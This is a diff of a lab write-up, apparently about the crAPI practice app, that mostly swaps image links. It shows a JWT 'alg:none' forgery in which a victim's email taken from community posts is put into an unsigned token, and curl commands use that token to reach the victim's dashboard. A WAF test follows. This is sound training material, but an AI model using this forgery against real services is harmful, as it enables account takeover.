@@ -11,7 +11,8 @@ Testing with two hostnames
 ```python unfold ln:false unwrap title:"code"
 curl http://10.1.10.104/identity/api/v2/user/dashboard  -s | jq
 ```
-![[Pasted image 20260901153630.png|736]]
+<img width="1142" height="202" alt="image" src="https://github.com/user-attachments/assets/441447cf-8e1d-40a1-9a82-6ecb9c3bacfe" />
+
 
 so the user access his dashboard with his token. 
 ```python unfold ln:false unwrap title:"code"
@@ -20,13 +21,14 @@ export token=$(curl -X POST http://10.1.10.104/identity/api/auth/login -d '{"ema
 #access user dashboard
 curl http://10.1.10.104/identity/api/v2/user/dashboard -H "Authorization: Bearer $token" -s | jq
 ```
-![778](../../../All%20Images/Pasted%20image%2020260917164224.png)
+<img width="1425" height="429" alt="image" src="https://github.com/user-attachments/assets/18c7d8ef-ee69-48ee-bc25-41a238fd2e84" />
+
 
 ### Forging JWT
 1- get the email address of another user 
 from community posts we discovered email of Pogba `pogba006@example.com`
-![[Pasted image 20260901155433.png|812]]
-![[Pasted image 20260901155546.png|817]]
+<img width="2147" height="883" alt="image" src="https://github.com/user-attachments/assets/13d240ac-89ed-4af0-b205-c54353baad3c" />
+<img width="1684" height="1230" alt="image" src="https://github.com/user-attachments/assets/e01ab559-1933-45d4-bc7c-f90884037789" />
 
 2- Change the value of the “alg” property from header part **RS256** to “**none**”. And also change the email address  to `pogba006@example.com`
 ```python unfold ln:false unwrap title:"Updated"
@@ -40,8 +42,8 @@ from community posts we discovered email of Pogba `pogba006@example.com`
   "role": "user"
 }
 ```
-
-![[Pasted image 20260901161442.png|870]]
+**jwt.io**
+<img width="2321" height="1057" alt="image" src="https://github.com/user-attachments/assets/d36392e3-a701-4794-b48b-55a29b61cbe5" />
 
 ```zsh unfold ln:false unwrap title:"code"
 export pogba_none_token=eyJhbGciOiJub25lIn0.eyJzdWIiOiJwb2diYTAwNkBleGFtcGxlLmNvbSIsImlhdCI6MTc4NzkyNDM3NywiZXhwIjoxNzg4NTI5MTc3LCJyb2xlIjoidXNlciJ9.
@@ -51,12 +53,14 @@ export pogba_none_token=eyJhbGciOiJub25lIn0.eyJzdWIiOiJwb2diYTAwNkBleGFtcGxlLmNv
 ```zsh unfold ln:false unwrap title:"code"
 curl http://10.1.10.104/identity/api/v2/user/dashboard -H "Authorization: Bearer $pogba_none_token" -s | jq
 ```
-![[Pasted image 20260901161049.png]]
+<img width="1836" height="456" alt="image" src="https://github.com/user-attachments/assets/c507e767-e374-4655-ab56-194ded026e3d" />
 
 ## WAF protection 
 ```zsh unfold ln:false unwrap title:"code"
 curl http://crapi.local/identity/api/v2/user/dashboard -H "Authorization: Bearer $pogba_none_token" -s | jq
 ```
-![[Pasted image 20260901161526.png]]
-![[Pasted image 20260901161801.png]]
+
+<img width="1814" height="270" alt="image" src="https://github.com/user-attachments/assets/031e61dd-4965-4340-b918-e616985a4f1f" />
+<img width="1672" height="856" alt="image" src="https://github.com/user-attachments/assets/28699cac-662a-44b2-8756-941c19c0fee6" />
+
 
